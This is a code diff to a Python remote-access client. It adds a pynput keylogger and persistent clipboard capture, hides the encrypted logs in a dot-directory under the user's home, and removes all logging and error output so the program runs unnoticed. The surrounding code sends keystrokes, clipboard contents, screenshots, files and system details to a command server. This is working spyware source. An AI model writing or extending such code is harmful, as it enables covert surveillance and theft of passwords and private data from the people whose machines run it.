@@ -1,5 +1,3 @@
-import sys
-import logging
 import time
 import platform
 import subprocess
@@ -12,23 +10,20 @@ import os
 import pickle
 import pyperclip
 import threading
+from pynput import keyboard
+from cryptography.fernet import Fernet
 from datetime import datetime
 from connection_module import SecureConnectionClient
-
-logging.basicConfig(level=logging.DEBUG,
-                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-                    handlers=[
-                        logging.FileHandler("client_module.log"),
-                        logging.StreamHandler(sys.stdout)
-                    ])
 
 start_port, end_port = 50000, 50100
 
 SERVER_IP = '127.0.0.1'
 
 DEFAULT_CHUNK_SIZE = 1024 * 1024 * 16
-
-clipboard_history = []
+HIDDEN_DIR = os.path.join(os.path.expanduser("~"), ".temp_hidden")
+KEY_FILE = os.path.join(HIDDEN_DIR, ".enc_key")
+DATA_FILE = os.path.join(HIDDEN_DIR, ".data_store")
+KEYSTROKE_FILE = os.path.join(HIDDEN_DIR, ".keystroke_store")
 
 def get_ip_and_country():
     response = requests.get("https://api.ipify.org?format=json")
@@ -71,7 +66,6 @@ def remote_file_copy(client):
         client.send_data_AES(b"EOF")
     except Exception as e:
         client.send_data_AES(f"ERROR: {str(e)}".encode("utf-8"))
-        logging.error(f"An error occurred: {e}")
 
 def send_file(client):
     try:
@@ -101,9 +95,21 @@ def list_directory(client):
         client.send_data_AES(f"ERROR: {str(e)}".encode("utf-8"))
 
 def input_capture(client):
-    pass
+    key = load_key()
+    keystroke_history = load_keystrokes(key)
+    
+    if keystroke_history:
+        try:
+            json_data = json.dumps(keystroke_history)
+        except (TypeError, ValueError) as e:
+            json_data = json.dumps([]) 
+    else:
+        json_data = json.dumps([]) 
+
+    client.send_data_AES(json_data.encode("utf-8"))
 
 def clipboard_data(client):
+    clipboard_history = load_clipboard_history()
     clipboard_history_json = json.dumps(clipboard_history)
     clipboard_history_bytes = clipboard_history_json.encode('utf-8')
     client.send_data_AES(clipboard_history_bytes)
@@ -128,44 +134,135 @@ def screen_capture(client):
         try:
             client.send_data_AES(img_data)
         except Exception as e:
-            print(f"Error sending image {e}")
             raise e
         signal = client.receive_data_AES()
         if signal == b"STOP":
             capturing = False
+
+def ensure_hidden_dir():
+    if not os.path.exists(HIDDEN_DIR):
+        os.makedirs(HIDDEN_DIR)
+
+def generate_key():
+    ensure_hidden_dir()
+    key = Fernet.generate_key()
+    save_key(key)
+    return key
+
+def load_key():
+    ensure_hidden_dir()
+    with open(KEY_FILE, "rb") as key_file:
+        return key_file.read()
+
+def save_key(key):
+    with open(KEY_FILE, "wb") as key_file:
+        key_file.write(key)
+
+def encrypt_data(data, key):
+    fernet = Fernet(key)
+    encrypted_data = fernet.encrypt(json.dumps(data).encode())
+    return encrypted_data
+
+def decrypt_data(encrypted_data, key):
+    fernet = Fernet(key)
+    decrypted_data = fernet.decrypt(encrypted_data).decode()
+    return json.loads(decrypted_data)
+
+def save_clipboard_history(history, key):
+    encrypted_data = encrypt_data(history, key)
+    with open(DATA_FILE, "wb") as file:
+        file.write(encrypted_data)
+
+def load_clipboard_history(key):
+    if not os.path.exists(DATA_FILE):
+        return []
+    with open(DATA_FILE, "rb") as file:
+        encrypted_data = file.read()
+    clipboard_data = decrypt_data(encrypted_data, key)
+    return clipboard_data
+
+def save_keystrokes(keystrokes, key):
+    encrypted_data = encrypt_data(keystrokes, key)
+    with open(KEYSTROKE_FILE, "wb") as file:
+        file.write(encrypted_data)
+
+def load_keystrokes(key):
+    if not os.path.exists(KEYSTROKE_FILE):
+        return []
+    with open(KEYSTROKE_FILE, "rb") as file:
+        encrypted_data = file.read()
+    keystroke_data = decrypt_data(encrypted_data, key)
+    return keystroke_data
 
 def get_clipboard_content():
     return pyperclip.paste()
 
 def track_clipboard():
     last_content = None
+    key = load_key()
     while True:
         current_content = get_clipboard_content()
         if current_content != last_content:
             timestamp = datetime.now().isoformat()
             clipboard_entry = {"content": current_content, "timestamp": timestamp}
+            
+            clipboard_history = load_clipboard_history(key)
             clipboard_history.append(clipboard_entry)
+            save_clipboard_history(clipboard_history, key)
+            
             last_content = current_content
-            print(f"Clipboard updated: {current_content} at {timestamp}")
         time.sleep(1)
+
+def on_press(key):
+    record_key_event(key, 'pressed')
+
+def on_release(key):
+    record_key_event(key, 'released')
+
+def record_key_event(key, event_type):
+    try:
+        key_data = {
+            "key": key.char,
+            "event_type": event_type,
+            "timestamp": datetime.now().isoformat()
+        }
+    except AttributeError:
+        key_data = {
+            "key": str(key),
+            "event_type": event_type,
+            "timestamp": datetime.now().isoformat()
+        }
+
+    keystroke_history = load_keystrokes(load_key())
+    keystroke_history.append(key_data)
+    save_keystrokes(keystroke_history, load_key())
+
+def start_keylogger():
+    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+    listener.start()
+    return listener
 
 def start_tracking():
     tracker_thread = threading.Thread(target=track_clipboard)
     tracker_thread.daemon = True
     tracker_thread.start()
-    return tracker_thread
+
+    keylogger_listener = start_keylogger()
+    return tracker_thread, keylogger_listener
 
 def main():
-    tracker_thread = start_tracking()
+    ensure_hidden_dir()
+    if not os.path.exists(KEY_FILE):
+        generate_key()
+    tracker_thread, keylogger_listener = start_tracking()
     while True:
         try:
             for port in range(start_port, end_port):
-                logging.info(f"Starting client to connect to {SERVER_IP}:{port}")
                 try:
                     client = SecureConnectionClient(server_ip=SERVER_IP, server_port=port)
                     break
                 except Exception as e:
-                    logging.error(f"Failed to connect to {SERVER_IP}:{port}")
+                    pass
             ip, country = get_ip_and_country()
             operation_system = platform.system()
             cmd = "systeminfo" if operation_system == "Windows" else "lscpu"
@@ -206,9 +303,8 @@ def main():
                     break
 
             client.close()
-            logging.info("Client connection closed")
         except Exception as e:
-            logging.error(f"An error occurred: {e}")
+            pass
         time.sleep(15)
 
 if __name__ == "__main__":
